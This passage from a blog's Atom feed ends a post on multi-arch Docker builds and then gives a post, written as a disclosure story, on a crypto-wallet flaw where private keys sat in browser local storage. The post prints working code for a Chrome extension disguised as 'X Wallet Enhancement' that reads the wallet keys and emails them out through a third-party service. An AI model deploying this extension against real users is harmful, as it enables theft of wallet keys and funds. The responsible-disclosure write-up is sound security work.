+&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;docker&lt;&#x2F;span&gt;&lt;span&gt; buildx build&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#a4a0e8;&quot;&gt; --platform&lt;&#x2F;span&gt;&lt;span&gt; linux&#x2F;amd64&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#a4a0e8;&quot;&gt; -t&lt;&#x2F;span&gt;&lt;span&gt; de-agent:amd64-latest&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#a4a0e8;&quot;&gt; --build-arg&lt;&#x2F;span&gt;&lt;span&gt; DE_AGENT_PYPI_TOKEN=&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#eccdbb;&quot;&gt;${&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#a4a0e8;&quot;&gt;DE_AGENT_PYPI_TOKEN&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#eccdbb;&quot;&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#a4a0e8;&quot;&gt; -f&lt;&#x2F;span&gt;&lt;span&gt; Dockerfile.amd64&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#a4a0e8;&quot;&gt; --no-cache&lt;&#x2F;span&gt;&lt;span&gt; .
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;build-arm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a7c81;&quot;&gt;# Build a Docker image for arm64
+&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;docker&lt;&#x2F;span&gt;&lt;span&gt;  buildx build&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#a4a0e8;&quot;&gt; --platform&lt;&#x2F;span&gt;&lt;span&gt; linux&#x2F;arm64&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#a4a0e8;&quot;&gt; -t&lt;&#x2F;span&gt;&lt;span&gt; de-agent:arm64-latest&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#a4a0e8;&quot;&gt; --build-arg&lt;&#x2F;span&gt;&lt;span&gt; DE_AGENT_PYPI_TOKEN=&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#eccdbb;&quot;&gt;${&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#a4a0e8;&quot;&gt;DE_AGENT_PYPI_TOKEN&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#eccdbb;&quot;&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#a4a0e8;&quot;&gt; -f&lt;&#x2F;span&gt;&lt;span&gt; Dockerfile.arm64&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#a4a0e8;&quot;&gt; --no-cache&lt;&#x2F;span&gt;&lt;span&gt; .
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#3b224c;color:#dbbfef;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;make&lt;&#x2F;span&gt;&lt;span&gt; build
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;docker-arm-build.png&quot; alt=&quot;Docker Image For Arm&quot; &#x2F;&gt;
+&lt;span class=&quot;img-title&quot;&gt;Docker image built for the amd64 architecture&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;One can say, it&#x27;s so much hassle for doing all of this locally and a proper CI can solve such
+a case easily. I agree – as I&#x27;ve mentioned, I like shifting work out of my shoulders and giving it
+to some machine in the cloud. But in situations where CI is not available, creating multi-arch
+images can save the day. It certainly did for me.&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Accidentally found a vulnerability in a crypto wallet and made $1,000</title>
+        <published>2023-08-05T00:00:00+00:00</published>
+        <updated>2023-08-05T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://akrisanov.com/crypto-wallet-vulnerability/" type="text/html"/>
+        <id>https://akrisanov.com/crypto-wallet-vulnerability/</id>
+        
+        <content type="html">&lt;p&gt;In January 2022, I joined the community of one of the proof-of-stake blockchains.
+To play with what the protocol and its ecosystem offered, I created a wallet account on
+the official website &lt;code&gt;https:&#x2F;&#x2F;wallet.****.org&lt;&#x2F;code&gt;. Apart from general curiosity, I was interested in
+how they achieved security in a browser, especially in the age of extensions and
+client-side vulnerabilities.&lt;&#x2F;p&gt;
+&lt;p&gt;It turned out that when a user logged in, the wallet application (built in React) generated a set
+of public and private keys and stored them in the browser&#x27;s local storage. With my experience of
+building authentication and authorization in distributed systems, I knew this was not the best
+thing to do – in general, it&#x27;s easy for a browser extension and client-side code to read data
+from local storage &lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#1&quot;&gt;1&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;To prove this, I decided to &lt;a rel=&quot;noopener&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;developer.chrome.com&#x2F;docs&#x2F;extensions&#x2F;mv3&#x2F;getstarted&#x2F;development-basics&#x2F;&quot;&gt;write a simple extension for Chrome&lt;&#x2F;a&gt; that would retrieve keys from a victim&#x27;s browser and send them to my
+anonymous email address.&lt;&#x2F;p&gt;
+&lt;p&gt;The root directory of my pickpocket extension looked like this:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#3b224c;color:#dbbfef;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; content.js
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; email.min.js
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; index.html
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;└──&lt;&#x2F;span&gt;&lt;span&gt; manifest.json
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The main files are the &lt;code&gt;manifest.json&lt;&#x2F;code&gt; and &lt;code&gt;content.js&lt;&#x2F;code&gt;. The former is essential for installing the extension.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;json&quot; style=&quot;background-color:#3b224c;color:#dbbfef;&quot; class=&quot;language-json &quot;&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;name&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;X Wallet Enhancement&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;,
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;version&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;1.0&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;,
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;manifest_version&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#efba5d;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;,
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;content_scripts&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;: [
+&lt;&#x2F;span&gt;&lt;span&gt;    {
+&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;matches&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;: [
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;https:&#x2F;&#x2F;wallet.****.org&#x2F;*&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;      ],
+&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;js&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;: [
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;email.min.js&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;,
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;content.js&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;      ]
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;  ]
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;code&gt;email.min.js&lt;&#x2F;code&gt; is just a client library from one of the cloud services that allows you to send
+email directly from a browser without any server code. &lt;code&gt;index.html&lt;&#x2F;code&gt; is a blank HTML page that
+displays nothing. The wallet hijacking logic lived in the &lt;code&gt;content.js&lt;&#x2F;code&gt; file:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#3b224c;color:#dbbfef;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;emailjs&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;init&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;#39;user_****&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;); &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a7c81;&quot;&gt;&#x2F;&#x2F; instantiating an email delivery service
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#eccdbb;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;templateParams &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a7c81;&quot;&gt;&#x2F;&#x2F; gathering information about the victim&amp;#39;s browser
+&lt;&#x2F;span&gt;&lt;span&gt;    from_name: navigator.userAgent,
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a7c81;&quot;&gt;&#x2F;&#x2F; fetching wallet keys from the local storage
+&lt;&#x2F;span&gt;&lt;span&gt;    storage: window.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;localStorage&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;getItem&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;#39;_*:wallet:active_account_id_**&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;),
+&lt;&#x2F;span&gt;&lt;span&gt;};
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a7c81;&quot;&gt;&#x2F;&#x2F; using a prepared email template to send an email with keys
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#eccdbb;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;serviceID &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;#39;service_****&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#eccdbb;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;templateID &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;#39;template_****&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;emailjs&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;send&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;serviceID&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;templateID&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;templateParams&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt; .&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;then&lt;&#x2F;span&gt;&lt;span&gt;(() &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#eccdbb;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#eccdbb;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;Wallet keys were send!&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt; }, (&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#a4a0e8;&quot;&gt;err&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#eccdbb;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#eccdbb;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;error&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#efba5d;&quot;&gt;JSON&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;stringify&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;err&lt;&#x2F;span&gt;&lt;span&gt;));
+&lt;&#x2F;span&gt;&lt;span&gt; });
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Yes, such a dummy script.&lt;&#x2F;p&gt;
+&lt;p&gt;I packed all four files into a zip archive and kindly asked my friend, who also had
+a wallet at &lt;code&gt;https:&#x2F;&#x2F;wallet.***.org&lt;&#x2F;code&gt;, to install my creation in his browser
+(pretending to do some social engineering). Before doing so, I told him about my findings and
+the theory I was trying to prove. He was happy to help, and the public and private keys of
+this wallet account appeared in my inbox a few seconds after the browser extension was installed.
+Next, I saved the keys to local storage in my browser and opened the wallet website.&lt;&#x2F;p&gt;
+&lt;p&gt;Surprisingly, my friend&#x27;s crypto-wallet balance was available to me, along with an option to
+withdraw the funds. During a Zoom call with my victim friend, I transferred some of his funds to
+an anonymous account and back. It was mind-blowing! A new, promising blockchain that had recently
+closed an investment round had a major vulnerability in its wallet. Worst of all, they had 2-factor
+authentication for users. Of course, not many people would activate it right away, and many didn&#x27;t.&lt;&#x2F;p&gt;
+&lt;p&gt;As an ethical developer, I created a vulnerability report, including the source code of
+the browser extension and my thoughts on how to improve the security of the web application.
+It was sent directly to the security team&#x27;s email address on 18th of January. A few days later,
+I had a call with the CISO of the blockchain protocol, who assured me that they were aware of
+the issue and would address it in the next release. I was a little disappointed with the speed of
+the response to the incident. Two days is an eternity when one speaks about users&#x27; money.
+Nevertheless, the blockchain developers granted me their tokens in an amount equivalent to 1,000 USDT.&lt;&#x2F;p&gt;
+&lt;div class=&quot;callout callout-danger&quot;&gt;
+&lt;strong&gt;Advice for application developers&lt;&#x2F;strong&gt;: be aware of the technologies you use and their security aspects.
+&lt;&#x2F;div&gt;
+&lt;div class=&quot;callout callout-warning&quot;&gt;
+&lt;strong&gt;Advice for crypto users&lt;&#x2F;strong&gt;: learn what security options an organisation offers to you,
+activate two-factor authentication as soon as you create a wallet account, don&#x27;t store all of
+your funds in hot wallets.
+&lt;&#x2F;div&gt;
+&lt;hr &#x2F;&gt;
+&lt;div class=&quot;footnote-definition&quot; id=&quot;1&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;1&lt;&#x2F;sup&gt;&lt;h2 id=&quot;worth-reading&quot;&gt;Worth reading&lt;&#x2F;h2&gt;
+&lt;&#x2F;div&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a rel=&quot;noopener&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;snyk.io&#x2F;blog&#x2F;is-localstorage-safe-to-use&#x2F;&quot;&gt;Is LocalStorage safe to use? | Snyk&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a rel=&quot;noopener&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;www.rdegges.com&#x2F;2018&#x2F;please-stop-using-local-storage&#x2F;&quot;&gt;Please Stop Using Local Storage&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a rel=&quot;noopener&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;developer.mozilla.org&#x2F;en-US&#x2F;docs&#x2F;Web&#x2F;HTTP&#x2F;Cookies&quot;&gt;Using HTTP cookies - HTTP | MDN&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a rel=&quot;noopener&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;owasp.org&#x2F;www-community&#x2F;HttpOnly&quot;&gt;HttpOnly | OWASP Foundation&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+</content>
+        
+    </entry>
+</feed>
